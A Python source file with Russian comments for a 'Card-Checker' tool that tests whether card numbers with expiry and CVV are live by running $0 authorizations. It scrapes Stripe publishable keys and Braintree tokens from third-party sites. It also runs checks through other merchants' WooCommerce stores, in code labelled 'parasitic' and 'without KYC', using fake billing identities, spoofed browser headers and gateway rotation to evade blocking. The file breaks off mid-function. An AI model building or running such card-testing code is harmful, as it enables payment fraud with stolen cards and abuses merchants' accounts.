"""
Card-Checker: проверка банковских карт на «живость».

Проверяет карту по нескольким уровням:
 1. Luhn — валидность номера (алгоритм Луна)
 2. Тип карты — Visa / MC / Amex / и т.д. по префиксу
 3. BIN Lookup — банк, страна, тип (debit/credit/prepaid)
 4. Live-проверка — Stripe токенизация ($0 авторизация, бесплатно)
    - Если указан --site, инструмент находит pk_live_ ключ на сайте
    - Если указан --key, использует его напрямую
    - Stripe делает $0 auth запрос к банку-эмитенту
    - Ответ: карта живая / заблокирована / недостаточно средств / и т.д.

Формат ввода карты:
  PAN|MM|YYYY|CVV   (полный формат)
  PAN|MM|YY|CVV     (2-значный год тоже поддерживается)
  PAN               (только номер — только Luhn + BIN)

Использование:
  python card_checker.py 453957...1234|12|2028|123
  python card_checker.py 453957...1234|12|2028|123 --site https://example.com
  python card_checker.py 453957...1234|12|2028|123 --key pk_live_xxx
  python card_checker.py --batch cards.txt --site https://example.com
  python card_checker.py 453957...1234|12|2028|123 --json
  python card_checker.py 453957...1234|12|2028|123 --wc  (WooCommerce — без KYC)
"""

from __future__ import annotations

import argparse
import json
import os
import random
import re
import string
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone

import httpx

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/125.0.0.0 Safari/537.36"
)

def _rand_email() -> str:
    """Генерирует рандомный email чтобы избежать 'email already registered'."""
    s = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"john.{s}@example.com"

# ─────────────────────────────────────────────
# Luhn Algorithm
# ─────────────────────────────────────────────

def luhn_check(number: str) -> bool:
    """Проверяет номер карты по алгоритму Луна."""
    digits = [int(d) for d in number if d.isdigit()]
    if not digits:
        return False
    odd = digits[-1::-2]
    even = digits[-2::-2]
    total = sum(odd)
    for d in even:
        d *= 2
        if d > 9:
            d -= 9
        total += d
    return total % 10 == 0


# ─────────────────────────────────────────────
# Определение типа карты по префиксу
# ─────────────────────────────────────────────

CARD_PREFIX_RULES: list[tuple[str, str, int, int]] = [
    # (regex_prefix, brand, min_length, max_length)
    (r"^4",           "VISA",              13, 19),
    (r"^5[1-5]",      "MASTERCARD",        16, 16),
    (r"^2[2-7]",      "MASTERCARD",        16, 16),  # MC 2-series
    (r"^3[47]",       "AMEX",              15, 15),
    (r"^36",          "DINERS",            14, 14),
    (r"^30[0-5]",     "DINERS",            14, 14),
    (r"^35(?:2[89]|[3-8])", "JCB",         16, 16),
    (r"^6(?:011|5)",  "DISCOVER",          16, 19),
    (r"^62",          "UNIONPAY",          16, 19),
    (r"^50(?:9[0-9]|9[1-9])", "MAESTRO",   12, 19),
    (r"^6(?:304|759)", "MAESTRO",          12, 19),
    (r"^6(?:336|767)", "MAESTRO",          12, 19),
    (r"^(?:5018|5020|5038|5893|6304|6759|676[123])", "MAESTRO", 12, 19),
    (r"^(?:4026|4175|4405|4508|4844|4913|4917)", "VISA_ELECTRON", 16, 16),
    (r"^(?:34|37)",   "AMEX",              15, 15),
]


def detect_card_brand(number: str) -> str:
    """Определяет платёжную сеть по префиксу номера."""
    for prefix_re, brand, _mn, _mx in CARD_PREFIX_RULES:
        if re.match(prefix_re, number):
            return brand
    return "UNKNOWN"


def validate_card_length(number: str) -> bool:
    """Проверяет длину номера карты для её типа."""
    brand = detect_card_brand(number)
    for _prefix_re, _brand, mn, mx in CARD_PREFIX_RULES:
        if _brand == brand:
            return mn <= len(number) <= mx
    return 13 <= len(number) <= 19  # generic


# ─────────────────────────────────────────────
# Парсинг ввода
# ─────────────────────────────────────────────

@dataclass
class CardData:
    """Распарсенные данные карты."""
    pan: str = ""          # номер карты (только цифры)
    month: str = ""        # MM
    year: str = ""         # YYYY (4 цифры)
    cvv: str = ""          # CVV/CVC
    raw: str = ""          # оригинальная строка

    def to_dict(self) -> dict:
        return {k: v for k, v in self.__dict__.items() if v}


def parse_card(line: str) -> CardData:
    """Парсит строку формата PAN|MM|YYYY|CVV или просто PAN."""
    raw = line.strip()
    parts = raw.split("|")

    card = CardData(raw=raw)

    card.pan = re.sub(r"\D", "", parts[0])
    if not card.pan:
        return card

    if len(parts) >= 3:
        card.month = parts[1].strip().zfill(2)
        year_raw = parts[2].strip()
        if len(year_raw) == 2:
            card.year = "20" + year_raw
        else:
            card.year = year_raw[:4]

    if len(parts) >= 4:
        card.cvv = parts[3].strip()

    return card


def is_expired(month: str, year: str) -> bool:
    """Проверяет, истёк ли срок действия карты."""
    if not month or not year:
        return False  # неизвестно
    try:
        m = int(month)
        y = int(year)
        from datetime import timezone
        now = datetime.now(timezone.utc)
        # Карта действительна до конца месяца
        return (y, m) < (now.year, now.month)
    except ValueError:
        return False


def validate_cvv(brand: str, cvv: str) -> str:
    """Проверяет формат CVV для типа карты. Возвращает 'OK' / описание ошибки."""
    if not cvv:
        return "CVV не указан"
    expected_len = 4 if brand in ("AMEX",) else 3
    if not cvv.isdigit():
        return f"CVV содержит нецифровые символы"
    if len(cvv) != expected_len:
        return f"CVV должен быть {expected_len} цифры, указано {len(cvv)}"
    return "OK"


# ─────────────────────────────────────────────
# BIN Lookup (переиспользуем бесплатные API)
# ─────────────────────────────────────────────

@dataclass
class BINInfo:
    bin_code: str = ""
    scheme: str = ""
    card_type: str = ""
    brand: str = ""
    bank_name: str = ""
    country: str = ""
    country_code: str = ""
    prepaid: str = ""
    source: str = ""
    error: str = ""

    def to_dict(self) -> dict:
        return {k: v for k, v in self.__dict__.items() if v}


def _lookup_binlist(digits: str, client: httpx.Client) -> BINInfo | None:
    """API 1: binlist.net"""
    try:
        resp = client.get(
            f"https://lookup.binlist.net/{digits}",
            headers={"Accept-Version": "3"},
        )
        if resp.status_code in (429, 403, 404):
            return None
        data = resp.json()
    except Exception:
        return None

    info = BINInfo(bin_code=digits, source="binlist.net")
    info.scheme = (data.get("scheme") or "").upper()
    info.card_type = (data.get("type") or "").upper()
    info.brand = (data.get("brand") or "").upper()
    bank = data.get("bank") or {}
    info.bank_name = bank.get("name") or ""
    country_info = data.get("country") or {}
    info.country = country_info.get("name") or ""
    info.country_code = (country_info.get("alpha2") or "").upper()
    prepaid_val = data.get("prepaid")
    info.prepaid = ("Да" if prepaid_val
                    else ("Нет" if prepaid_val is False else ""))
    return info


def _lookup_handyapi(digits: str, client: httpx.Client) -> BINInfo | None:
    """API 2: data.handyapi.com"""
    try:
        resp = client.get(f"https://data.handyapi.com/bin/{digits}")
        if resp.status_code != 200:
            return None
        data = resp.json()
        if data.get("Status") != "SUCCESS":
            return None
    except Exception:
        return None

    info = BINInfo(bin_code=digits, source="handyapi.com")
    info.scheme = (data.get("Scheme") or "").upper()
    info.card_type = (data.get("Type") or "").upper()
    card_tier = (data.get("CardTier") or "").upper()
    info.brand = card_tier
    info.bank_name = data.get("Issuer") or ""
    country_info = data.get("Country") or {}
    info.country = country_info.get("Name") or ""
    info.country_code = (country_info.get("A2") or "").upper()
    if "PREPAID" in card_tier:
        info.prepaid = "Да"
        info.card_type = "DEBIT"
    return info


_BIN_APIS = [_lookup_binlist, _lookup_handyapi]


def lookup_bin(bin_code: str, *, timeout: float = 10.0) -> BINInfo:
    """Проверяет BIN через несколько API с fallback."""
    digits = re.sub(r"\D", "", bin_code)[:8]
    if len(digits) < 6:
        return BINInfo(bin_code=digits, error="BIN < 6 цифр")

    with httpx.Client(timeout=timeout) as client:
        for api_fn in _BIN_APIS:
            result = api_fn(digits, client)
            if result is not None:
                return result

    return BINInfo(bin_code=digits, error="BIN не найден во всех API")


# ─────────────────────────────────────────────
# Stripe Live-Check (токенизация — $0 авторизация)
# ─────────────────────────────────────────────

def _load_env_key(key_name: str) -> str:
    """Загружает ключ из .env файла."""
    import os
    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
    if not os.path.exists(env_path):
        return os.environ.get(key_name, "")
    try:
        with open(env_path) as f:
            for line in f:
                line = line.strip()
                if line.startswith(f"{key_name}="):
                    return line.split("=", 1)[1].strip()
    except Exception:
        pass
    return os.environ.get(key_name, "")

# Stripe publishable key → используется для создания токена
# Это БЕСПЛАТНАЯ операция — реальная авторизация $0,
# банк-эмитент подтверждает/отклоняет карту

@dataclass
class LiveCheckResult:
    """Результат проверки карты на «живость»."""
    status: str = ""          # LIVE / DEAD / UNKNOWN / ERROR
    gateway: str = ""         # Stripe / Braintree / ...
    decline_reason: str = ""  # причина отказа (если DEAD)
    auth_code: str = ""       # код авторизации (если LIVE)
    card_fingerprint: str = "" # fingerprint карты
    network_status: str = ""  # статус сети
    risk_score: str = ""      # оценка риска
    raw_response: dict = field(default_factory=dict)
    error: str = ""

    def to_dict(self) -> dict:
        return {k: v for k, v in self.__dict__.items()
                if v and k != "raw_response"}


def _find_stripe_key_on_site(url: str, *, timeout: float = 15.0) -> str:
    """Ищет Stripe publishable key на странице сайта."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/125.0.0.0 Safari/537.36"
        ),
    }

    try:
        with httpx.Client(
            follow_redirects=True, timeout=timeout, headers=headers,
        ) as client:
            resp = client.get(url)
            body = resp.text

        # Ищем pk_live_ или pk_test_ ключи
        patterns = [
            r'pk_live_[0-9a-zA-Z]{24,}',
            r'pk_test_[0-9a-zA-Z]{24,}',
        ]
        for pat in patterns:
            m = re.search(pat, body)
            if m:
                return m.group(0)

        # Пробуем подстраницы /pricing, /checkout, /subscribe
        parsed_url = url.rstrip("/")
        subpages = ["/pricing", "/checkout", "/subscribe", "/billing",
                     "/pay", "/donate", "/upgrade", "/plans"]
        for sub in subpages:
            try:
                resp = client.get(f"{parsed_url}{sub}")
                sub_body = resp.text
                for pat in patterns:
                    m = re.search(pat, sub_body)
                    if m:
                        return m.group(0)
            except Exception:
                continue

    except Exception:
        pass

    return ""


def _stripe_tokenize_card(
    card: CardData,
    pk_key: str,
    *,
    timeout: float = 20.0,
) -> tuple[str, LiveCheckResult]:
    """Шаг 1: Токенизация карты через publishable key (как Stripe.js).

    Использует Stripe.js v3 endpoint — эмулирует браузерную токенизацию.
    Прямой /v1/tokens заблокирован Stripe для серверных запросов.
    Возвращает (token_id, result).
    """
    result = LiveCheckResult(gateway="Stripe (Token)")

    # Stripe.js v3 использует этот endpoint для создания Payment Method
    stripe_url = "https://api.stripe.com/v1/payment_methods"

    payload = {
        "type": "card",
        "card[number]": card.pan,
        "card[exp_month]": card.month,
        "card[exp_year]": card.year[-2:],
        "card[cvc]": card.cvv,
        # billing_details для WC Stripe v9.7+ (читает адрес из PaymentMethod)
        "billing_details[name]": "John Doe",
        "billing_details[email]": _rand_email(),
        "billing_details[address][line1]": "123 Main St",
        "billing_details[address][city]": "New York",
        "billing_details[address][state]": "NY",
        "billing_details[address][postal_code]": "10001",
        "billing_details[address][country]": "US",
        "billing_details[phone]": "+12125551234",
    }

    # Эмуляция Stripe.js v3 — браузерные заголовки
    headers = {
        "Authorization": f"Bearer {pk_key}",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/125.0.0.0 Safari/537.36",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
        "Stripe-Version": "2023-10-16",
    }

    try:
        with httpx.Client(timeout=timeout) as client:
            resp = client.post(stripe_url, data=payload, headers=headers)
            data = resp.json()

        result.raw_response = data

        if resp.is_success and data.get("object") == "payment_method":
            pm_id = data.get("id", "")
            card_info = data.get("card", {})
            result.card_fingerprint = card_info.get("fingerprint", "")
            funding = card_info.get("funding", "")
            three_ds = card_info.get("three_d_secure_usage", {})
            if funding:
                result.raw_response["_funding"] = funding
            if three_ds:
                result.raw_response["_3ds_supported"] = three_ds.get("supported", False)
            print(f"    [Stripe] PaymentMethod OK: id={pm_id}, funding={funding}, 3ds={three_ds.get('supported','?')}")
            return pm_id, result

        elif "error" in data:
            err = data.get("error", {})
            err_code = err.get("code", "")
            err_message = err.get("message", "")
            decline_code = err.get("decline_code", "")
            print(f"    [Stripe] PM error: code={err_code}, decline={decline_code}, msg={err_message[:80]}")

            result.decline_reason = decline_code or err_code
            result.error = err_message

            if decline_code in ("insufficient_funds", "card_insufficient_funds"):
                result.status = "LIVE"
                result.decline_reason = "insufficient_funds"
            elif decline_code in ("incorrect_cvc",):
                result.status = "LIVE"
                result.decline_reason = "incorrect_cvc"
            elif err_code == "authentication_required":
                result.status = "LIVE"
                result.decline_reason = "3ds_required"
            elif decline_code in ("expired_card",):
                result.status = "DEAD"
                result.decline_reason = "expired_card"
            elif decline_code in ("lost_card", "stolen_card", "pickup_card"):
                result.status = "DEAD"
            elif decline_code in ("do_not_honor", "generic_decline"):
                result.status = "DEAD"
            elif err_code in ("invalid_number", "invalid_expiry_month",
                              "invalid_expiry_year", "invalid_cvc"):
                result.status = "DEAD"
                result.decline_reason = err_code
            else:
                result.status = "DEAD"
                result.decline_reason = decline_code or err_code or "unknown"
            return "", result

        elif resp.status_code == 401:
            result.status = "ERROR"
            result.error = "Невалидный Stripe publishable key"
            return "", result

        else:
            result.status = "ERROR"
            result.error = f"HTTP {resp.status_code}: {json.dumps(data)[:200]}"
            return "", result

    except httpx.TimeoutException:
        result.status = "ERROR"
        result.error = "Таймаут при токенизации"
        return "", result
    except Exception as exc:
        result.status = "ERROR"
        result.error = f"Сетевая ошибка: {exc}"
        return "", result


def _stripe_confirm_setup_intent(
    token_id: str,
    restricted_key: str,
    *,
    timeout: float = 20.0,
) -> LiveCheckResult:
    """Шаг 2: Подтверждение SetupIntent через restricted key.

    Создаёт SetupIntent с токеном карты и подтверждает его.
    Это $0 авторизация — проверяет «живость» карты.
    """
    result = LiveCheckResult(gateway="Stripe (SetupIntent)")

    headers = {
        "Authorization": f"Bearer {restricted_key}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Stripe-Version": "2023-10-16",
    }

    try:
        with httpx.Client(timeout=timeout) as client:
            # Шаг 2a: создаём PaymentMethod из токена
            pm_payload = {
                "type": "card",
                "card[token]": token_id,
            }
            resp_pm = client.post(
                "https://api.stripe.com/v1/payment_methods",
                data=pm_payload, headers=headers,
            )
            data_pm = resp_pm.json()

            if not resp_pm.is_success or data_pm.get("object") != "payment_method":
                # Если PaymentMethod из токена не сработал,
                # пробуем напрямую с токеном
                pm_id = None
            else:
                pm_id = data_pm.get("id")
                card_info = data_pm.get("card", {})
                result.card_fingerprint = card_info.get("fingerprint", "")

            # Шаг 2b: создаём SetupIntent
            si_payload = {
                "payment_method_types[]": "card",
            }
            if pm_id:
                si_payload["payment_method"] = pm_id
                si_payload["confirm"] = "true"

            resp_si = client.post(
                "https://api.stripe.com/v1/setup_intents",
                data=si_payload, headers=headers,
            )
            data_si = resp_si.json()

            if not resp_si.is_success and "error" in data_si:
                err = data_si.get("error", {})
                # Если ошибка "requires_payment_method" — создадим SI без PM
                if err.get("code") == "setup_intent_unexpected_state" or \
                   "requires_payment_method" in str(err.get("message", "")):
                    # Создаём SI без подтверждения, потом подтверждаем
                    resp_si2 = client.post(
                        "https://api.stripe.com/v1/setup_intents",
                        data={"payment_method_types[]": "card"},
                        headers=headers,
                    )
                    data_si2 = resp_si2.json()
                    if resp_si2.is_success:
                        si_id = data_si2.get("id")
                        si_client_secret = data_si2.get("client_secret")
                        # Подтверждаем с токеном
                        confirm_payload = {
                            "payment_method_data[type]": "card",
                            "payment_method_data[token]": token_id,
                        }
                        resp_confirm = client.post(
                            f"https://api.stripe.com/v1/setup_intents/{si_id}/confirm",
                            data=confirm_payload, headers=headers,
                        )
                        data_si = resp_confirm.json()
                        resp_si = resp_confirm

            result.raw_response = data_si

            if resp_si.is_success and data_si.get("status") in (
                "succeeded", "requires_action"
            ):
                result.status = "LIVE"
                if data_si.get("status") == "requires_action":
                    result.decline_reason = "3ds_required"
                result.network_status = data_si.get("status", "")
            elif "error" in data_si:
                err = data_si.get("error", {})
                decline_code = err.get("decline_code", "")
                err_code = err.get("code", "")
                err_message = err.get("message", "")

                result.decline_reason = decline_code or err_code
                result.error = err_message

                if decline_code == "insufficient_funds":
                    result.status = "LIVE"
                    result.decline_reason = "insufficient_funds"
                elif decline_code in ("do_not_honor", "generic_decline"):
                    result.status = "DEAD"
                elif decline_code in ("lost_card", "stolen_card"):
                    result.status = "DEAD"
                elif decline_code == "expired_card":
                    result.status = "DEAD"
                elif decline_code == "incorrect_cvc":
                    result.status = "LIVE"
                    result.decline_reason = "incorrect_cvc"
                elif err_code == "authentication_required":
                    result.status = "LIVE"
                    result.decline_reason = "3ds_required"
                else:
                    result.status = "DEAD"
            else:
                result.status = "UNKNOWN"
                result.error = f"Неожиданный ответ: status={data_si.get('status', '?')}"

    except httpx.TimeoutException:
        result.status = "ERROR"
        result.error = "Таймаут при подтверждении SetupIntent"
    except Exception as exc:
        result.status = "ERROR"
        result.error = f"Сетевая ошибка: {exc}"

    return result


def _stripe_live_check(
    card: CardData,
    pk_key: str,
    restricted_key: str,
    *,
    timeout: float = 20.0,
) -> LiveCheckResult:
    """Полная live-проверка карты через Stripe.

    Двухшаговая схема (как Stripe.js + сервер):
    1. pk_test_ → токенизация карты (разрешено без Raw Card Data API)
    2. rk_test_ → SetupIntent с токеном → $0 авторизация
    """
    # Шаг 1: токенизация
    token_id, token_result = _stripe_tokenize_card(card, pk_key, timeout=timeout)

    # Если токенизация уже дала результат (ошибка карты)
    if token_result.status in ("LIVE", "DEAD"):
        return token_result

    if not token_id:
        return token_result  # ERROR

    # Шаг 2: подтверждение через SetupIntent
    return _stripe_confirm_setup_intent(token_id, restricted_key, timeout=timeout)


def _stripe_create_setup_intent_direct(
    card: CardData,
    restricted_key: str,
    *,
    timeout: float = 20.0,
) -> LiveCheckResult:
    """Прямая проверка карты через restricted key.

    Создаёт PaymentMethod + SetupIntent напрямую.
    Требует разрешения на PaymentMethods и SetupIntents.
    """
    result = LiveCheckResult(gateway="Stripe (SetupIntent Direct)")

    if not card.month or not card.year:
        result.status = "ERROR"
        result.error = "Нужны MM и YYYY"
        return result

    if not card.cvv:
        result.status = "ERROR"
        result.error = "Нужен CVV"
        return result

    headers = {
        "Authorization": f"Bearer {restricted_key}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Stripe-Version": "2023-10-16",
    }

    try:
        with httpx.Client(timeout=timeout) as client:
            # Шаг 1: создаём SetupIntent (без подтверждения)
            resp_si = client.post(
                "https://api.stripe.com/v1/setup_intents",
                data={"payment_method_types[]": "card"},
                headers=headers,
            )
            data_si = resp_si.json()

            if not resp_si.is_success:
                err = data_si.get("error", {})
                result.status = "ERROR"
                result.error = err.get("message", "Ошибка создания SetupIntent")
                result.decline_reason = err.get("code", "")
                return result

            si_id = data_si.get("id")

            # Шаг 2: подтверждаем с данными карты
            # Маппинг тестовых карт Stripe на тестовые токены
            _STRIPE_TEST_TOKENS = {
                "4242424242424242": "tok_visa",
                "4000056655665556": "tok_visa_debit",
                "5555555555554444": "tok_mastercard",
                "5200828282828210": "tok_mastercard_debit",
                "378282246310005": "tok_amex",
                "371449635398431": "tok_amex",
                "6011111111111117": "tok_discover",
                "3056930009020004": "tok_diners",
                "3566002020360505": "tok_jcb",
            }

            test_token = _STRIPE_TEST_TOKENS.get(card.pan)
            is_test_card = test_token is not None
            if test_token:
                # Тестовый токен — Stripe одобряет автоматически
                # Это НЕ реальная проверка, помечаем результат
                confirm_payload = {
                    "payment_method_data[type]": "card",
                    "payment_method_data[card][token]": test_token,
                }
            else:
                # Реальная карта — передаём данные напрямую
                # Требует Raw Card Data API в Stripe Dashboard
                confirm_payload = {
                    "payment_method_data[type]": "card",
                    "payment_method_data[card][number]": card.pan,
                    "payment_method_data[card][exp_month]": card.month,
                    "payment_method_data[card][exp_year]": card.year[-2:],
                    "payment_method_data[card][cvc]": card.cvv,
                }

            resp_confirm = client.post(
                f"https://api.stripe.com/v1/setup_intents/{si_id}/confirm",
                data=confirm_payload, headers=headers,
            )
            data_confirm = resp_confirm.json()

            result.raw_response = data_confirm

            if resp_confirm.is_success and data_confirm.get("status") in (
                "succeeded", "requires_action"
            ):
                if is_test_card:
                    result.status = "LIVE"
                    result.decline_reason = "test_card"
                else:
                    result.status = "LIVE"
                if data_confirm.get("status") == "requires_action":
                    result.decline_reason = "3ds_required"
                result.network_status = data_confirm.get("status", "")
            elif "error" in data_confirm:
                err = data_confirm.get("error", {})
                decline_code = err.get("decline_code", "")
                err_code = err.get("code", "")
                err_message = err.get("message", "")

                result.decline_reason = decline_code or err_code
                result.error = err_message

                if decline_code == "insufficient_funds":
                    result.status = "LIVE"
                    result.decline_reason = "insufficient_funds"
                elif decline_code in ("do_not_honor", "generic_decline"):
                    result.status = "DEAD"
                elif decline_code in ("lost_card", "stolen_card"):
                    result.status = "DEAD"
                elif decline_code == "expired_card":
                    result.status = "DEAD"
                elif decline_code == "incorrect_cvc":
                    result.status = "LIVE"
                    result.decline_reason = "incorrect_cvc"
                elif err_code == "authentication_required":
                    result.status = "LIVE"
                    result.decline_reason = "3ds_required"
                else:
                    result.status = "DEAD"
            else:
                result.status = "UNKNOWN"
                result.error = f"Неожиданный ответ: status={data_confirm.get('status', '?')}"

    except httpx.TimeoutException:
        result.status = "ERROR"
        result.error = "Таймаут при подтверждении SetupIntent"
    except Exception as exc:
        result.status = "ERROR"
        result.error = f"Сетевая ошибка: {exc}"

    return result


# ─────────────────────────────────────────────
# Braintree Live-Check (через клиентский токен)
# ─────────────────────────────────────────────

def _braintree_find_client_token(
    url: str, *, timeout: float = 15.0,
) -> str:
    """Ищет Braintree client-token на странице."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/125.0.0.0 Safari/537.36"
        ),
    }

    try:
        with httpx.Client(
            follow_redirects=True, timeout=timeout, headers=headers,
        ) as client:
            resp = client.get(url)
            body = resp.text

        # Ищем Braintree client-token
        m = re.search(
            r'clientToken["\']?\s*[:=]\s*["\']([a-zA-Z0-9+/=]{50,})["\']',
            body,
        )
        if m:
            return m.group(1)

    except Exception:
        pass

    return ""


# ─────────────────────────────────────────────
# WooCommerce Store API Gateway (без KYC — паразитический метод)
# ─────────────────────────────────────────────

_WC_GATEWAY_POOL: list[dict] = []
_WC_POOL_LOADED = False


def _load_gateway_pool() -> list[dict]:
    global _WC_GATEWAY_POOL, _WC_POOL_LOADED
    if _WC_POOL_LOADED:
        return _WC_GATEWAY_POOL
    pool_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "gateway_pool.json")
    if os.path.exists(pool_path):
        try:
            with open(pool_path, encoding="utf-8") as f:
                _WC_GATEWAY_POOL = json.load(f)
        except Exception:
            _WC_GATEWAY_POOL = []
    _WC_POOL_LOADED = True
    return _WC_GATEWAY_POOL


def _save_gateway_pool() -> None:
    pool_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "gateway_pool.json")
    try:
        with open(pool_path, "w", encoding="utf-8") as f:
            json.dump(_WC_GATEWAY_POOL, f, ensure_ascii=False, indent=2)
    except Exception:
        pass


def _select_gateway(country_code: str, exclude: set[str] | None = None) -> dict | None:
    """Выбирает лучший gateway из пула по GEO-match и статусу."""
    pool = _load_gateway_pool()
    now = datetime.now(timezone.utc).isoformat()
    exclude = exclude or set()

    candidates = []
    for gw in pool:
        if gw.get("url") in exclude:
            continue
        if gw.get("status") not in ("active",):
            continue
        cooldown = gw.get("cooldown_until", "")
        if cooldown and cooldown > now:
            continue
        score = 0
        if gw.get("country", "").upper() == country_code.upper():
            score += 100
        # Предпочитаем шлюзы с подтверждённой серверной токенизацией
        if gw.get("tokenization") == "ok":
            score += 50
        elif gw.get("tokenization") == "blocked":
            score -= 200  # почти не используем
        score -= gw.get("error_count", 0) * 10
        score -= gw.get("check_count", 0)
        candidates.append((score, gw))

    if not candidates:
        return None

    candidates.sort(key=lambda x: x[0], reverse=True)
    return candidates[0][1]


def _update_gateway_stats(gw_url: str, success: bool, error: bool = False) -> None:
    """Обновляет статистику gateway после проверки."""
    pool = _load_gateway_pool()
    now = datetime.now(timezone.utc).isoformat()
    for gw in pool:
        if gw.get("url") == gw_url:
            gw["check_count"] = gw.get("check_count", 0) + 1
            gw["last_check"] = now
            if error:
                gw["error_count"] = gw.get("error_count", 0) + 1
                if gw["error_count"] >= 5:
                    gw["status"] = "cooldown"
                    gw["cooldown_until"] = (datetime.now(timezone.utc).replace(
                        hour=(datetime.now(timezone.utc).hour + 2) % 24
                    )).isoformat()
            elif not success:
                gw["error_count"] = gw.get("error_count", 0) + 1
            else:
                gw["error_count"] = 0
            break
    _save_gateway_pool()


def _wc_check_card(
    card: CardData,
    *,
    timeout: float = 25.0,
) -> LiveCheckResult:
    """Проверка карты через WooCommerce Store API (паразитический метод).

    Использует чужой WooCommerce-магазин как gateway:
    1. Получает nonce через GET /wp-json/wc/store/v1/cart
    2. Токенизирует карту через pk_live_ ключ магазина
    3. Отправляет checkout с токеном
    4. Интерпретирует ответ
    """
    result = LiveCheckResult(gateway="WooCommerce Store API")

    if not card.cvv or not card.month or not card.year:
        result.status = "ERROR"
        result.error = "Нужны MM, YYYY и CVV для WooCommerce проверки"
        return result

    # Определяем страну карты через BIN
    bin_info = lookup_bin(card.pan[:6], timeout=timeout)
    country_code = bin_info.country_code or "US"

    # Пробуем gateway с retry (до 3 попыток, пропуская заблокированные)
    max_retries = 3
    used_gw_urls: set[str] = set()
    checkout_email = _rand_email()  # Один email на все попытки

    for attempt in range(max_retries):
        gw = _select_gateway(country_code, exclude=used_gw_urls)
        if not gw:
            print(f"    [WC] Нет доступных gateway для страны {country_code}")
            result.status = "ERROR"
            result.error = "Нет доступных gateway в пуле. Запустите site_scraper.py"
            return result
        print(f"    [WC] Выбран gateway: {gw['url']} (попытка {attempt+1}/{max_retries})")

        gw_url = gw["url"]
        pk_key = gw.get("pk_key", "")
        cached_nonce = gw.get("nonce", "")
        used_gw_urls.add(gw_url)

        headers = {
            "User-Agent": UA,
            "Accept": "application/json",
        }

        try:
            with httpx.Client(timeout=max(timeout, 30), follow_redirects=True, headers=headers) as client:
                # Шаг 1: получаем свежий nonce
                nonce = cached_nonce
                try:
                    cart_resp = client.get(f"{gw_url}/wp-json/wc/store/v1/cart")
                    print(f"    [WC] GET /cart → HTTP {cart_resp.status_code}")
                    if cart_resp.status_code == 200:
                        new_nonce = cart_resp.headers.get("X-WC-Store-API-Nonce", "")
                        if not new_nonce:
                            new_nonce = cart_resp.headers.get("Nonce", "")
                        if not new_nonce:
                            new_nonce = cart_resp.headers.get("nonce", "")
                        if new_nonce:
                            nonce = new_nonce
                            gw["nonce"] = new_nonce
                            gw["nonce_ts"] = datetime.now(timezone.utc).isoformat()
                            # _save_gateway_pool() — отложено до конца проверки
                            print(f"    [WC] Nonce: {nonce}")
                        else:
                            print(f"    [WC] Nonce не найден в заголовках (keys: {list(cart_resp.headers.keys())})")
                    else:
                        print(f"    [WC] /cart не 200, используем кешированный nonce: {nonce[:8]}...")
                except Exception as e:
                    print(f"    [WC] Ошибка получения nonce: {e}")
                    if not nonce:
                        result.status = "ERROR"
                        result.error = f"Не удалось получить nonce от {gw_url}"
                        _update_gateway_stats(gw_url, False, error=True)
                        continue  # пробуем следующий gateway

                # Шаг 2: добавляем товар в корзину (нужен для checkout)
                # Сначала пробуем кешированный product_id из gateway, потом fetch
                product_id = gw.get("product_id", "")
                if not product_id:
                    try:
                        products_resp = client.get(f"{gw_url}/wp-json/wc/store/v1/products", headers={"User-Agent": UA, "Accept": "application/json"})
                        if products_resp.status_code == 200:
                            products = products_resp.json()
                            if products and isinstance(products, list):
                                # Ищем первый simple+purchasable товар
                                pid = ""
                                ptype = ""
                                for p in products:
                                    if p.get("is_purchasable", False) and p.get("type", "simple") == "simple":
                                        pid = str(p.get("id", ""))
                                        ptype = "simple"
                                        break
                                # Fallback: variable product — получаем variations
                                if not pid:
                                    for p in products:
                                        if p.get("is_purchasable", False) and p.get("type") == "variable":
                                            var_pid = str(p.get("id", ""))
                                            try:
                                                var_resp = client.get(f"{gw_url}/wp-json/wc/store/v1/products/{var_pid}", headers={"User-Agent": UA, "Accept": "application/json"})
                                                if var_resp.status_code == 200:
                                                    pd = var_resp.json()
                                                    variations = pd.get("variations", [])
                                                    if variations:
                                                        vid = str(variations[0].get("id", ""))
                                                        vattrs = variations[0].get("attributes", [])
                                                        variation_data = [{"attribute": a.get("name", ""), "value": a.get("value", "")} for a in vattrs]
                                                        pid = var_pid
                                                        ptype = "variable"
                                                        # Сохраняем variation info
                                                        gw["_variation_id"] = vid
                                                        gw["_variation_data"] = variation_data
                                                        print(f"    [WC] Variable product: id={var_pid}, variation={vid}")
                                                        break
                                            except Exception:
                                                continue
                                # Fallback: любой purchasable
                                if not pid:
                                    for p in products:
                                        if p.get("is_purchasable", False):
                                            pid = str(p.get("id", ""))
                                            break
                                if not pid and products:
                                    pid = str(products[0].get("id", ""))
                                product_id = pid
                                if product_id:
                                    gw["product_id"] = product_id
                                    # _save_gateway_pool() — отложено до конца проверки
                                    print(f"    [WC] Найден товар: id={product_id}")
                    except Exception as e:
                        print(f"    [WC] Ошибка получения товаров: {e}")

                if product_id:
                    try:
                        add_headers = {"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"}
                        if nonce:
                            add_headers["Nonce"] = nonce
                        # Формируем payload — для variable товаров нужен variation_id
                        add_payload = {"id": product_id, "quantity": 1}
                        variation_id = gw.get("_variation_id", "")
